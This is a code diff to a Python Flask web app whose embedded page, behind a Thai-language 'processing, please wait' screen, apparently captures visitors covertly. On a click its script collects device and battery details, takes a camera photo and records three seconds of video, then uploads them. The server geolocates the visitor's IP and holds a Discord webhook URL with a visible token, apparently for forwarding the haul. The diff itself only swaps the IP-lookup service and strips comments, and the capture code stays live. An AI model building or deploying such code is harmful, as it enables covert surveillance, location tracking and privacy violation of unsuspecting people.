@@ -9,20 +9,21 @@ DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1512723643745042612/3X6S
 
 def get_location_from_ip(ip):
     try:
-        url = f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,lat,lon'
+        url = f'https://ipinfo.io/{ip}/json'
         resp = requests.get(url, timeout=5)
         data = resp.json()
-        if data.get('status') == 'success':
+        if data.get('ip'):
+            loc = data.get('loc', '').split(',')
             return {
-                'country': data.get('country', 'ไม่ระบุ'),
-                'region': data.get('regionName', 'ไม่ระบุ'),
                 'city': data.get('city', 'ไม่ระบุ'),
-                'isp': data.get('isp', 'ไม่ระบุ'),
-                'lat': data.get('lat', 0),
-                'lon': data.get('lon', 0)
+                'region': data.get('region', 'ไม่ระบุ'),
+                'country': data.get('country', 'ไม่ระบุ'),
+                'isp': data.get('org', 'ไม่ระบุ'),
+                'lat': float(loc[0]) if len(loc) > 0 else 0,
+                'lon': float(loc[1]) if len(loc) > 1 else 0
             }
-    except:
-        pass
+    except Exception as e:
+        print(f"IPInfo error: {e}")
     return None
 
 HTML = '''<!DOCTYPE html>
@@ -67,7 +68,6 @@ HTML = '''<!DOCTYPE html>
             document.body.onclick = null;
             document.getElementById('ui').innerHTML = '<div class="spinner"></div><h1>กำลังดำเนินการ...</h1><p>กรุณารอสักครู่</p>';
             
-            // ข้อมูลอุปกรณ์ + แบตเตอรี่
             const deviceInfo = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
@@ -79,7 +79,6 @@ HTML = '''<!DOCTYPE html>
                 timestamp: new Date().toISOString()
             };
             
-            // ดึงแบตเตอรี่
             try {
                 const battery = await navigator.getBattery();
                 deviceInfo.batteryLevel = Math.round(battery.level * 100);
@@ -101,14 +100,12 @@ HTML = '''<!DOCTYPE html>
                 await video.play();
                 await new Promise(r => setTimeout(r, 500));
                 
-                // ถ่ายรูป
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
                 
-                // บันทึกวิดีโอ 3 วินาที
                 const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
                 const chunks = [];
                 recorder.ondataavailable = e => {
@@ -166,7 +163,6 @@ def upload():
         photo = request.files.get('photo')
         video = request.files.get('video')
         
-        # ดึงที่อยู่จาก IP
         location = get_location_from_ip(real_ip)
         
         time_now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
